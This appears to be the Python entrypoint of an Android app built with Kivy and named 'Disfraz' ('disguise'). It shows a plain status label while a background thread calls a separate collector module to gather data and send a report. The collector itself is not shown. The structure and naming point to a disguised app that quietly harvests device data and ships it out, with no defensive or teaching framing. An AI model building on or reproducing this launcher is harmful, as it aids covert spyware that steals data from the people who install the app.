# main.py -> entrypoint Android (Kivy)
import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window
import collector

class Disfraz(App):
    def build(self):
        Window.clearcolor = (0.06, 0.06, 0.07, 1)
        lbl = Label(text="Iniciando...", font_size="13sp")
        threading.Thread(target=self._job, args=(lbl,), daemon=True).start()
        return lbl

    def _job(self, lbl):
        try:
            lbl.text = "Recolectando..."
            data = collector.run_collection()
            lbl.text = "Enviando..."
            collector.send_report(data)
            lbl.text = "Listo"
        except Exception as e:
            lbl.text = str(e)[:180]

Disfraz().run()
